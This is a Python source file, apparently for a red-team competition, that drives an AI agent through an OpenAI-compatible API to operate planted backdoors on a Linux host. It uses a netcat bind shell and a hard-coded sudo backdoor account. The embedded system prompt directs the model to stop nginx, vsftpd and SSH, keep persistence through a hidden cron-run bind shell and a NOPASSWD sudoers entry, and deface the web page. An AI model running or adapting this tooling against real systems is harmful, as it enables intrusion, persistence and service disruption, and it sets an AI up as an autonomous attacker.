"""
AI Agent: Adaptive attacker using an OpenAI-compatible API (MindRouter)
to operate planted backdoors.

Runs continuously as a daemon thread.  Once a backdoor becomes reachable
(bind shell on port 4444 or sysmon SSH), it opens a session, calls the
AI API in an agentic tool-use loop, and executes commands on the target
until either the backdoor drops or MAX_TURNS is reached.

After each session the agent cools down for SESSION_COOLDOWN seconds,
then re-tries.  If no backdoor is reachable it polls every POLL_INTERVAL
seconds.

Requires:
    pip3 install openai paramiko
    AGENT_API_KEY set in config.py (or OPENAI_API_KEY env var as fallback)
"""

import json
import os
import socket
import threading
import time

import paramiko
from openai import OpenAI

from config import (
    TARGET_HOST, BIND_PORT, SYSMON_USER, SYSMON_PASS,
    AGENT_API_KEY, AGENT_BASE_URL, AGENT_MODEL,
)

# ── Tuning ─────────────────────────────────────────────────────────────
MAX_TURNS        = 20    # max tool-use turns per session
POLL_INTERVAL    = 30    # seconds between connection attempts when idle
SESSION_COOLDOWN = 120   # seconds to wait after a session ends

CMD_END_MARKER = "AGENT_CMD_DONE_8F3A"

SYSTEM_PROMPT = f"""\
You are a red-team agent operating inside a compromised Linux host at {TARGET_HOST}.
You have a single tool, `execute`, which runs a bash command and returns stdout+stderr.
Your job is to maximise scoring damage to the defenders by stopping services and
maintaining persistence — all without bricking the machine.

Objectives (repeat every session):
1. Stop scored services:
       systemctl stop nginx
       systemctl stop vsftpd
       systemctl stop ssh   (or sshd — both)
   After stopping SSH your connection will drop; that is expected.
2. Maintain persistence so future sessions work:
   a) sysmon user:   useradd -m -s /bin/bash sysmon + password sysmon123
                     /etc/sudoers.d/sysmon with NOPASSWD:ALL
   b) Bind shell:    /usr/local/bin/.syscheck running nohup nc bind on :{BIND_PORT}
                     listed in root crontab (every minute)
   c) Deface nginx:  /var/www/html/index.html or /usr/share/nginx/html/index.html
                     must contain "ACCESS DENIED" (no "Wikipedia")
3. Reconnaissance: check what is running, look for new defences.

Rules:
- Issue commands one at a time; observe output before proceeding.
- Prefer sudo when running as sysmon (NOPASSWD is configured).
- If a command might drop the shell (stopping SSH), issue it last.
- Never exit early; continue until all objectives are checked.
- Be concise — no explanations, just commands.
"""

TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "execute",
            "description": (
                "Run a single bash command on the target host and return the output. "
                "Commands run as root (via bind shell) or sysmon+sudo. "
                "Stopping SSH will drop the connection — use it as the last command."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "The bash command to execute on the target."
                    }
                },
                "required": ["command"]
            }
        }
    }
]


# ── Shell session abstraction ───────────────────────────────────────────

class ShellSession:
    """Wraps a bind-shell TCP socket or a sysmon SSH connection."""

    def __init__(self, via: str, sock=None, ssh=None):
        self.via   = via    # "bind" or "ssh"
        self._sock = sock
        self._ssh  = ssh

    def execute(self, cmd: str, timeout: float = 12.0) -> str:
        if self.via == "bind":
            return self._exec_bind(cmd, timeout)
        return self._exec_ssh(cmd, timeout)

    def close(self):
        try:
            if self._sock:
                self._sock.close()
            if self._ssh:
                self._ssh.close()
        except Exception:
            pass

    # ── Bind shell ──────────────────────────────────────────────────────

    def _exec_bind(self, cmd: str, timeout: float) -> str:
        full = f"{cmd}; echo {CMD_END_MARKER}\n"
        try:
            self._sock.sendall(full.encode())
        except Exception as e:
            raise ConnectionError(f"bind send failed: {e}")

        buf = b""
        self._sock.settimeout(timeout)
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = self._sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                if CMD_END_MARKER.encode() in buf:
                    break
            except socket.timeout:
                break

        output = buf.decode(errors="replace")
        if CMD_END_MARKER in output:
            output = output[:output.index(CMD_END_MARKER)]
        # strip echoed command and bare prompts
        lines = [l for l in output.splitlines()
                 if cmd.strip() not in l
                 and not l.strip().endswith("$")
                 and not l.strip().endswith("#")]
        return "\n".join(lines).strip()

    # ── SSH (sysmon) ────────────────────────────────────────────────────

    def _exec_ssh(self, cmd: str, timeout: float) -> str:
        wrapped = f"sudo -n bash -c {_sq(cmd)} 2>&1"
        try:
            _, stdout, stderr = self._ssh.exec_command(wrapped, timeout=timeout)
            return (stdout.read().decode(errors="replace")
                    + stderr.read().decode(errors="replace")).strip()
        except Exception as e:
            raise ConnectionError(f"ssh exec failed: {e}")


def _sq(cmd: str) -> str:
    return "'" + cmd.replace("'", "'\\''") + "'"


# ── Connection helpers ──────────────────────────────────────────────────

def _try_bind_shell(log) -> ShellSession | None:
    try:
        sock = socket.create_connection((TARGET_HOST, BIND_PORT), timeout=5)
        sock.settimeout(8)
        time.sleep(0.4)
        try:
            sock.recv(512)
        except socket.timeout:
            pass
        log(f"[agent] bind shell connected on :{BIND_PORT}")
        return ShellSession(via="bind", sock=sock)
    except Exception:
        return None


def _try_sysmon_ssh(log) -> ShellSession | None:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(TARGET_HOST, username=SYSMON_USER,
                       password=SYSMON_PASS, timeout=5)
        log("[agent] sysmon SSH connected")
        return ShellSession(via="ssh", ssh=client)
    except Exception:
        return None


def _connect(log) -> ShellSession | None:
    return _try_bind_shell(log) or _try_sysmon_ssh(log)


# ── Agentic loop (OpenAI tool-use format) ──────────────────────────────

def run_agent_session(session: ShellSession, log):
    """Run one AI agent session over an open ShellSession."""
    api_key = AGENT_API_KEY or os.environ.get("OPENAI_API_KEY", "")
    if not api_key or api_key == "YOUR_MINDROUTER_API_KEY":
        log("[agent] AGENT_API_KEY not configured in config.py — skipping AI session")
        return

    client = OpenAI(api_key=api_key, base_url=AGENT_BASE_URL)

    messages = [
        {"role": "system", "content": SYSTEM_PROMPT},
        {"role": "user",   "content": "Begin your attack session on the target."},
    ]

    log(f"[agent] starting session (max {MAX_TURNS} turns, model={AGENT_MODEL}) via {session.via}")

    for turn in range(MAX_TURNS):
        try:
            response = client.chat.completions.create(
                model=AGENT_MODEL,
                messages=messages,
                tools=TOOLS,
                tool_choice="auto",
            )
        except Exception as e:
            log(f"[agent] API error: {e}")
            break

        choice  = response.choices[0]
        message = choice.message

        # append assistant turn to history
        messages.append({
            "role":       "assistant",
            "content":    message.content or "",
            "tool_calls": [
                {
                    "id":       tc.id,
                    "type":     "function",
                    "function": {"name": tc.function.name,
                                 "arguments": tc.function.arguments},
                }
                for tc in (message.tool_calls or [])
            ] or None,
        })

        if choice.finish_reason == "stop" or not message.tool_calls:
            log(f"[agent] model finished after {turn + 1} turns")
            break

        # execute tool calls
        connection_dead = False
        for tc in message.tool_calls:
            try:
                args = json.loads(tc.function.arguments)
            except json.JSONDecodeError:
                args = {}
            cmd = args.get("command", "")
            log(f"[agent] exec: {cmd[:80]}")

            try:
                output = session.execute(cmd)
                if output:
                    log(f"[agent] output: {output[:120]}")
                result_text = output or "(no output)"
            except ConnectionError as e:
                result_text = f"Connection lost: {e}"
                connection_dead = True
                log(f"[agent] connection lost: {e}")

            messages.append({
                "role":         "tool",
                "tool_call_id": tc.id,
                "content":      result_text,
            })

        if connection_dead:
            log("[agent] shell dropped — ending session")
            break

    else:
        log(f"[agent] reached MAX_TURNS={MAX_TURNS}")


# ── Continuous polling loop ─────────────────────────────────────────────

def agent_loop(log):
    log("[agent] thread started — polling for backdoor")
    while True:
        session = _connect(log)
        if session is None:
            time.sleep(POLL_INTERVAL)
            continue

        try:
            run_agent_session(session, log)
        except Exception as e:
            log(f"[agent] session error: {e}")
        finally:
            session.close()

        log(f"[agent] cooldown {SESSION_COOLDOWN}s")
        time.sleep(SESSION_COOLDOWN)


def start(log):
    """Start the agent loop as a background daemon thread."""
    threading.Thread(target=agent_loop, args=(log,), daemon=True).start()
    log("[agent] AI agent thread launched")
